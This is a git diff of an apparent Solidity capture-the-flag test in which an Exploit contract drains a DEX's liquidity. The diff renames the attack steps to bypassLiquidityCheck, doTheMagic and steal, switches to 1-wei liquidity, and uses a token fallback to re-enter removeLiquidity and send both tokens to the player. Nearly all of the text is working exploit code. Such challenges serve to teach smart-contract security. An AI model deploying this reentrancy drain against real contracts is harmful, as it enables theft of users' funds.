@@ -39,8 +39,6 @@ contract Challenge2Test is Test {
     }
 
     function testChallenge2() public {  
-
-
         /*//////////////////////////////
         //    Add your hack below!    //
         //////////////////////////////*/
@@ -51,18 +49,13 @@ contract Challenge2Test is Test {
         token0.transfer(address(exp), 1 ether);
         token1.transfer(address(exp), 1 ether);
 
-        exp.hack();
-        exp.hack1();
-        exp.hack2();
-
-        console.log("balance of exp in target", target.balanceOf(address(exp)));
+        exp.bypassLiquidityCheck();
+        exp.doTheMagic();
+        exp.steal();
 
         vm.stopPrank();
 
-        console.log("token0 player balance", token0.balanceOf(player));
-        console.log("token1 player balance", token1.balanceOf(player));
-        console.log("token0 target balance", token0.balanceOf(address(target)));
-        console.log("token1 target balance", token1.balanceOf(address(target)));
+        /*////////////////////////////*/
 
         assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
         assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
@@ -92,23 +85,19 @@ contract Exploit {
         owner = _player;
     }
 
-    function hack() public {
-        token0.approve(address(dex), 1 ether);
-        token1.approve(address(dex), 1 ether);
-
-        dex.addLiquidity(1 ether, 1 ether);
-
+    function bypassLiquidityCheck() public {
+        token0.approve(address(dex), type(uint256).max);
+        token1.approve(address(dex), type(uint256).max);
+        dex.addLiquidity(1 wei, 1 wei);
         initialized = true;
     }
 
-    function hack1() public {
-        dex.removeLiquidity(1 ether);
+    function doTheMagic() public {
+        dex.removeLiquidity(1 wei);
     }
 
-    function hack2() public {
-        uint256 balance = token0.balanceOf(address(dex));
-        dex.removeLiquidity(balance);
-
+    function steal() public {
+        dex.removeLiquidity(dex.totalSupply());
         token0.transfer(owner, token0.balanceOf(address(this)));
         token1.transfer(owner, token1.balanceOf(address(this)));
     }
@@ -117,7 +106,7 @@ contract Exploit {
         console.log("token fallback");
         if(initialized && !hacked){
             hacked = true;
-            dex.removeLiquidity(1 ether);
+            dex.removeLiquidity(1 wei);
         }
     }
 }
